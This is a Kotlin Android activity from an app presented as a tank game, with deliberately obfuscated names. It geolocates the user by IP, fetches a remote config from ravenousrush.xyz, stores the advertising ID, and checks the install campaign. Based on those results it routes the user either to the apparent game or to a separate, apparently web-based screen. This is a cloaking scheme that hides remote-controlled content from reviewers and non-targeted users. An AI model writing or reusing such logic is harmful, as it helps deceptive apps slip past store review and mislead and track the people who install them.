package com.fungames.battletank.accctiv

import android.content.Intent
import androidx.appcompat.app.AppCompatActivity
import android.os.Bundle
import com.google.android.gms.ads.identifier.AdvertisingIdClient
import com.orhanobut.hawk.Hawk
import kotlinx.coroutines.Dispatchers
import kotlinx.coroutines.GlobalScope
import kotlinx.coroutines.Job
import kotlinx.coroutines.launch
import retrofit2.Retrofit
import retrofit2.converter.gson.GsonConverterFactory
import java.util.concurrent.Executors
import java.util.concurrent.TimeUnit
import com.appsflyer.AppsFlyerConversionListener
import com.appsflyer.AppsFlyerLib
import com.fungames.battletank.DevvvAppp
import com.fungames.battletank.apclas.AppClaaaaasss.Companion.ididid
import com.fungames.battletank.apclas.AppClaaaaasss.Companion.apapapapdjfjhf
import com.fungames.battletank.apclas.AppClaaaaasss.Companion.gtjgtjjgti
import com.fungames.battletank.apclas.AppClaaaaasss.Companion.lllllinnka
import com.fungames.battletank.databinding.ActivityMainBinding


class MainActivity : AppCompatActivity() {


    override fun onCreate(savedInstanceState: Bundle?) {
        super.onCreate(savedInstanceState)
        jukjkouk = ActivityMainBinding.inflate(layoutInflater)
        setContentView(jukjkouk.root)
        GlobalScope.launch(Dispatchers.IO) {
            vfvfvfvf
        }
        gtggtgtgtgt()

    }

    private fun gtggtgtgtgt() {
        AppsFlyerLib.getInstance()
            .init("W8oq3QezbP9VWfnfHCxhaL", ccrfrfrf, applicationContext)
        tjgtogtgthguhgtgtuhgthgt()
    }

    private fun tjgtogtgthguhgtgtuhgthgt() {
        AppsFlyerLib.getInstance().start(this)
    }

    lateinit var jukjkouk: ActivityMainBinding

    val bggbbgbgbg by lazy {
        val tttttttt = "http://pro.ip-api.com/"
        Retrofit.Builder()
            .addConverterFactory(GsonConverterFactory.create())
            .baseUrl(tttttttt)
            .build()
            .create(DevvvAppp::class.java)
    }

    private fun hhygtffgg() {
        val bgbbhnnhhn = AdvertisingIdClient(applicationContext)
        bgbbhnnhhn.start()
        val jjujuujuj = bgbbhnnhhn.info.id
        Hawk.put(ididid, jjujuujuj)
    }


    private suspend fun gtgtgttt(): String? {
        val retData = bggbbgbgbg.getData().body()?.gtjitgjigtjgtj
        return retData

    }


    private suspend fun hhyjujuujujujujujuj(): String? {
        val gtggttgtg = "http://ravenousrush.xyz/"
        val retroBuildTwo = Retrofit.Builder()
            .addConverterFactory(GsonConverterFactory.create())
            .baseUrl(gtggttgtg)
            .build()
            .create(DevvvAppp::class.java)

        val hyjuujikki55 = retroBuildTwo.getDataDev().body()

        val frfrrr = hyjuujikki55?.hykohkkk
        val frrffrrf = hyjuujikki55?.gtuitgiuhtughgtiuhgth
        Hawk.put(apapapapdjfjhf, frrffrrf)
        Hawk.put(lllllinnka, frfrrr)
        val bbgbg = hyjuujikki55?.frrffrrfrfrf
        return bbgbg
    }


    private val vfvfvfvf: Job = GlobalScope.launch(Dispatchers.IO) {
        val kkiikik: String = gtgtgttt().toString()
        val gtgtgtgt = hhyjujuujujujujujuj().toString()
        val vfvfvfvfvfvfvf: String? = Hawk.get(apapapapdjfjhf)
        var ggtgthyhy: String? = Hawk.get(gtjgtjjgti)

        hhygtffgg()
        if (vfvfvfvfvfvfvf == "1") {
            val executorService = Executors.newSingleThreadScheduledExecutor()
            executorService.scheduleAtFixedRate({
                if (ggtgthyhy != null) {
                    if (ggtgthyhy!!.contains("tdb2") || gtgtgtgt.contains(kkiikik)) {
                        executorService.shutdown()
                        hyujujujhynhhbgbgbgvfvffccdcd()
                    } else {
                        executorService.shutdown()
                        vffvbgbgbgnhhnhyhygtgtgt()
                    }
                } else {
                    ggtgthyhy = Hawk.get(gtjgtjjgti)
                }

            }, 0, 2, TimeUnit.SECONDS)
        } else if (gtgtgtgt.contains(kkiikik)) {
            hyujujujhynhhbgbgbgvfvffccdcd()
        } else {
            vffvbgbgbgnhhnhyhygtgtgt()
        }
    }

    private fun vffvbgbgbgnhhnhyhygtgtgt() {
        startActivity(Intent(this@MainActivity, GyyymyActivity::class.java))
        gitjjgtjgtijgtjijtgj()
    }

    private fun hyujujujhynhhbgbgbgvfvffccdcd() {
        startActivity(Intent(this@MainActivity, ViieeevVeebiActivity::class.java))
        gitjjgtjgtijgtjijtgj()
    }

    private fun gitjjgtjgtijgtjijtgj() {
        finish()
    }

    private val ccrfrfrf = object : AppsFlyerConversionListener {
        override fun onConversionDataSuccess(data: MutableMap<String, Any>?) {
            val rfrfrf = data?.get("campaign").toString()
            Hawk.put(gtjgtjjgti, rfrfrf)
        }

        override fun onConversionDataFail(p0: String?) {
        }

        override fun onAppOpenAttribution(p0: MutableMap<String, String>?) {

        }

        override fun onAttributionFailure(p0: String?) {
        }
    }
}

